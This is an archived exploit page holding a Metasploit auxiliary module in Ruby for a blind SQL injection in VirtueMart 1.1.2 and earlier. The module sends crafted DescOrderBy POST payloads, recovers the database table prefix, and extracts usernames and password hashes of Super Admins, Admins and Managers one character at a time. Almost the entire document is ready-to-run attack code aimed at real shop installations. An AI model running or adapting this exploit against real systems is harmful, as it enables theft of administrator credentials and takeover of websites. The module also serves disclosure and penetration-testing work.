<html><head><title>VirtueMart <= 1.1.2 Remote SQL Injection Exploit (meta)</title></head><pre>

require 'msf/core'

class Metasploit3 &lt; Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           =&gt; 'VirtueMart &lt;= 1.1.2 Sql Injection Exploit',
			'Description'    =&gt; %q{
					This module exploits VirtueMart &lt;= 1.1.2 Blind Sql Injection vulnerability.
			},
			'Author'         =&gt; 'Janek Vind &quot;waraxe&quot; &lt;come2waraxe[at]yahoo.com&gt;',
			'License'        =&gt; MSF_LICENSE,
			'Version'        =&gt; '1.0',
			'References'     =&gt;
				[
					['BID', '33480'],
					['URL', 'http://www.waraxe.us/advisory-71.html'],
					['URL', 'http://secunia.com/advisories/33671/']
				],
			'DisclosureDate' =&gt; 'Jan 24 2009'))

			register_options(
				[
					OptString.new('URI', [false, 'Path to VirtueMart', '']),
					OptInt.new('TARGETID', [false, 'Target ID (optional)']),
					OptString.new('PREFIX', [false, 'Database table prefix (optional)', 'jos_']),
					OptBool.new('ALLSA', [ false,  'Fetch all Super Admins', true]),
					OptBool.new('ALLA', [ false,  'Fetch all Admins', false]),
					OptBool.new('ALLM', [ false,  'Fetch all Managers', false]),
				], self.class)
			
	end

	def run

		@marker = 'name=&quot;addtocart&quot;'
		@target_uri = '/' + datastore['URI'] + '/'
		@target_uri = @target_uri.gsub(/\/{2,}/, '/')
		@target_id = datastore['TARGETID'] 
		@target_prefix = datastore['PREFIX']
		@requests = @fetched = 0
		time_start = Time.now.to_i
		
		# debug_level=2 - more debug messages, 1 - less
		@debug_level = 1
		
		if(!pre_test)
			print_error('Exploit failed in pre-test phase')
			return
		end

		if(datastore['ALLSA'])
			if(!get_users(1))
				print_error('Exploit failed fetching Super Admins')
				return
			end
		end
		
		if(datastore['ALLA'])
			if(!get_users(2))
				print_error('Exploit failed fetching Admins')
				return
			end
		end
		
		if(datastore['ALLM'])
			if(!get_users(3))
				print_error('Exploit failed fetching Managers')
				return
			end
		end
		
		if((@target_id &lt; 1) and (!datastore['ALLSA']) and (!datastore['ALLA']) and (!datastore['ALLM']))
			print_status('Target ID or group(s) not specified, fetching Super Admins as default')
			if(!get_users(1))
				print_error('Exploit failed fetching Super Admins')
				return
			end
		end
		
		if(@target_id &gt; 1)
			if(!get_user())
				print_error(&quot;Exploit failed fetching user with ID=#{@target_id}&quot;)
				return
			end
		end
		
		time_spent = Time.now.to_i - time_start
		
		print_status(&quot;Exploitation results:&quot;)
		print_status(&quot;Got data for  #{@fetched} users&quot;)
		print_status(&quot;Total time spent: #{time_spent} seconds&quot;)
		print_status(&quot;HTTP requests needed: #{@requests}&quot;)
		
	end
	############################################################
	def make_post(post_data)
		
		timeout = 30
		
		begin	
		
			res = send_request_cgi({
				'uri'     =&gt; @target_uri,
				'method'  =&gt; 'POST',
				'data'  =&gt; post_data,
			}, timeout)
			
			if(res and res.body)
				@requests += 1
				return res.body
			else
				print_error('No response from server')
				return nil
			end
			
		rescue ::Exception
			print_error(&quot;Error: #{$!.class} #{$!}&quot;)
			return nil
		end
	end
	############################################################
	def test_condition(condition)
		
		max_tries = 10

		post_data  = &quot;page=shop.browse&amp;option=com_virtuemart&amp;vmcchk=1&amp;DescOrderBy=,&quot;
		post_data &lt;&lt; &quot;IF(#{condition},1,(SELECT 1 UNION ALL SELECT 1))&quot;
		
		1.upto(max_tries) do |i|
			
			buf = make_post(post_data)
			
			if(buf)
				return buf.include?(@marker)
			else
				print_status(&quot;Sleeping #{i} seconds&quot;)
				sleep(i)
				print_status(&quot;Awake, retry ##{i}&quot;)
			end
		end
		
		return nil
	end
	############################################################
	def pre_test
		
		post_data  = 'page=shop.browse&amp;option=com_virtuemart&amp;vmcchk=1'
		buf = make_post(post_data) or return false

		if(!buf.include?(@marker))
			print_error('Pre-test 1 failed - VirtueMart not detected')
			return false
		else
			print_status('Pre-test 1 passed - VirtueMart detected')
		end

		post_data  = 'page=shop.browse&amp;option=com_virtuemart&amp;vmcchk=1&amp;DescOrderBy=,'
		buf = make_post(post_data) or return false

		if(buf.include?(@marker))
			print_error('Pre-test 2 failed - target is patched?')
			return false
		else
			print_status('Pre-test 2 passed - injection detected')
		end
		
		post_data  = 'page=shop.browse&amp;option=com_virtuemart&amp;vmcchk=1&amp;DescOrderBy=,(SELECT 1)'
		buf = make_post(post_data) or return false

		if(!buf.include?(@marker))
			print_error('Pre-test 3 failed - subselects not supported?')
			return false
		else
			print_status('Pre-test 3 passed - subselects supported')
		end
		
		if(@target_prefix == '')
			print_status('Prefix not provided, trying to fetch')
			@target_prefix = get_prefix
			if(!@target_prefix)
				print_error('Prefix fetch failed')
				return false
			else
				print_status(&quot;Prefix fetched: #{@target_prefix}&quot;)
				return true
			end
		end
		
		post_data  = &quot;page=shop.browse&amp;option=com_virtuemart&amp;vmcchk=1&amp;DescOrderBy=,&quot; +
			&quot;(SELECT 1 FROM #{@target_prefix}users LIMIT 1)&quot;
			
		buf = make_post(post_data) or return false
		
		if(!buf.include?(@marker))
			print_error('Pre-test 4 failed - wrong prefix?')
			print_status('Trying to fetch valid prefix')
			@target_prefix = get_prefix
			if(!@target_prefix)
				print_error('Prefix fetch failed')
				return false
			else
				print_status(&quot;Prefix fetched: #{@target_prefix}&quot;)
				return true
			end
		else
			print_status('Pre-test 4 passed - prefix OK')
		end
		
		return true
	end
	############################################################
	def get_char(pattern, min, max)
	
		num = get_num(pattern, min, max) or return nil
		
		return num.chr
		
	end
	############################################################
	def get_hash(group = nil, u_pos = nil)
		
		hash = ''
	
		if(group and u_pos)
			pattern = &quot;(SELECT LENGTH(password)FROM #{@target_prefix}users WHERE usertype=#{group} ORDER BY id ASC LIMIT #{u_pos},1)&quot;
		else
			pattern = &quot;(SELECT LENGTH(password)FROM #{@target_prefix}users WHERE id=#{@target_id})&quot;
		end
		
		p_len = get_num(pattern, 32, 100) or return nil
		
		print_status(&quot;Got hash length: #{p_len.to_s}&quot;)
		
		1.upto(p_len) do |pos|
			print_status(&quot;Finding hash char pos #{pos}&quot;) if @debug_level &gt; 0
				
			if(group and u_pos)
				pattern = &quot;(SELECT ORD(SUBSTR(password,#{pos},1))FROM #{@target_prefix}users WHERE usertype=#{group} ORDER BY id ASC LIMIT #{u_pos},1)&quot;
			else
				pattern = &quot;(SELECT ORD(SUBSTR(password,#{pos},1))FROM #{@target_prefix}users WHERE id=#{@target_id})&quot;
			end
			
			c = get_char(pattern, 32, 128) or return nil

			hash &lt;&lt; c
			print_status(&quot;Known: #{hash}&quot;) if @debug_level &gt; 0

		end
		
		return hash
		
	end
	############################################################
	def get_prefix
		
		prefix = ''
		
		post_data  = 'page=shop.browse&amp;option=com_virtuemart&amp;vmcchk=1&amp;DescOrderBy=,' +
			'(SELECT 1 FROM INFORMATION_SCHEMA.TABLES LIMIT 1)'
		buf = make_post(post_data) or return false

		if(!buf.include?(@marker))
			print_error('INFORMATION_SCHEMA not found - mysql &lt; 5.0?')
			return false
		else
			print_status('INFORMATION_SCHEMA detected, proceed')
		end
		
		pattern = '(SELECT LENGTH(table_name)FROM INFORMATION_SCHEMA.TABLES' +
			' WHERE table_name LIKE 0x25766d5f70726f64756374 ORDER BY table_name ASC LIMIT 0,1)'
		 
		p_len = get_num(pattern, 5, 100) or return nil
		p_len -= 10
		
		if(p_len &lt; 0)
			print_error(&quot;Invalid prefix length: #{p_len.to_s}&quot;)
			return false
		elsif(p_len == 0)
			print_status('Prefix seems to be empty')
			@target_prefix = ''
			return true
		else
			print_status(&quot;Got prefix length: #{p_len.to_s}&quot;)
		end
		
		1.upto(p_len) do |pos|
			print_status(&quot;Finding prefix char pos #{pos}&quot;) if @debug_level &gt; 0
			
			pattern = &quot;(SELECT ORD(SUBSTR(table_name,#{pos},1))FROM INFORMATION_SCHEMA.TABLES&quot; +
			&quot; WHERE table_name LIKE 0x25766d5f70726f64756374 ORDER BY table_name ASC LIMIT 0,1)&quot;
			
			c = get_char(pattern, 32, 128) or return nil

			prefix &lt;&lt; c
			print_status(&quot;Known: #{prefix}&quot;) if @debug_level &gt; 0

		end
		
		return prefix
	end
	############################################################
	def get_num(pattern, min = 1, max = 100)
		
		curr = 0;

		while(1)
			
			area = max - min
			if(area &lt; 2 )
				post_data = &quot;#{pattern}=#{max}&quot;
				eq = test_condition(post_data)
			
				if(eq == nil)
					return nil
				elsif(eq)
					len = max
				else
					len = min
				end
				
				break
			end
		
			half = area / 2
			curr = min + half
		
			post_data = &quot;#{pattern}&gt;#{curr}&quot;
		
			bigger = test_condition(post_data)
		
			if(bigger == nil)
				return nil
			elsif(bigger)
				min = curr
			else
				max = curr
			end

			print_status(&quot;Current: #{min}-#{max}&quot;) if @debug_level &gt; 1
			
		end
		
		return len
		
	end
	############################################################
	def get_username(group = nil, u_pos = nil)
		
		username = ''
		
		if(group and u_pos)
			pattern = &quot;(SELECT LENGTH(username)FROM #{@target_prefix}users WHERE usertype=#{group} ORDER BY id ASC LIMIT #{u_pos},1)&quot;
		else
			pattern = &quot;(SELECT LENGTH(username)FROM #{@target_prefix}users WHERE id=#{@target_id})&quot;
		end
		
		u_len = get_num(pattern, 1, 150) or return nil
		
		print_status(&quot;Got username length: #{u_len.to_s}&quot;)
		
		1.upto(u_len) do |pos|
			print_status(&quot;Finding username char pos #{pos}&quot;) if @debug_level &gt; 0
			
			if(group and u_pos)
				pattern = &quot;(SELECT ORD(SUBSTR(username,#{pos},1))FROM #{@target_prefix}users WHERE usertype=#{group} ORDER BY id ASC LIMIT #{u_pos},1)&quot;
			else
				pattern = &quot;(SELECT ORD(SUBSTR(username,#{pos},1))FROM #{@target_prefix}users WHERE id=#{@target_id})&quot;
			end
				
			c = get_char(pattern, 32, 128) or return nil

			username &lt;&lt; c
			print_status(&quot;Known: #{username}&quot;) if @debug_level &gt; 0
			
		end
		
		return username
		
	end
	############################################################
	def get_users(group)
		
		if(group == 1)
			usertype = '0x53757065722041646d696e6973747261746f72'
			print_status('Starting to fetch all Super Admins')
		elsif(group == 2)
			usertype = '0x41646d696e6973747261746f72'
			print_status('Starting to fetch all Admins')
		else
			usertype = '0x4d616e61676572'
			print_status('Starting to fetch all Managers')
		end
		
		pattern = &quot;(SELECT COUNT(username)FROM #{@target_prefix}users WHERE usertype=#{usertype})&quot;

		u_cnt = get_num(pattern, 0, 100) or return nil
		
		print_status(&quot;Targets to fetch: #{u_cnt.to_s}&quot;)
		
		0.upto(u_cnt - 1) do |pos|
			
			print_status(&quot;Fetching user pos #{pos}&quot;)
			
			username = get_username(usertype, pos) or return nil
			hash = get_hash(usertype, pos) or return nil
			@fetched += 1
			
			print_status(
				&quot;Got user data:&quot; +
				&quot;\n==============================\n&quot; +
				&quot;Username: #{username}\n&quot; +
				&quot;Hash: #{hash}&quot; +
				&quot;\n==============================&quot;
			)
			
		end
		
		return true
	end
	############################################################
	def get_user
		
		print_status(&quot;Testing user ID=#{@target_id}&quot;)
		pattern = &quot;(SELECT COUNT(username)FROM #{@target_prefix}users WHERE ID=#{@target_id})&quot;
		u_cnt = get_num(pattern, 0, 100) or return nil
		
		if(u_cnt != 1)
			print_error(&quot;No user with ID=#{@target_id}&quot;)
			return true
		end
		
		print_status(&quot;Working with user ID=#{@target_id}&quot;)
		
		username = get_username or return nil
		hash = get_hash or return nil
		@fetched += 1
		
		print_status(
			&quot;Got user data:&quot; +
			&quot;\n==============================\n&quot; +
			&quot;Username: #{username}\n&quot; +
			&quot;Hash: #{hash}&quot; +
			&quot;\n==============================&quot;
		)
			
		return true
	end
	############################################################	
end

# milw0rm.com [2009-03-31]</pre></html>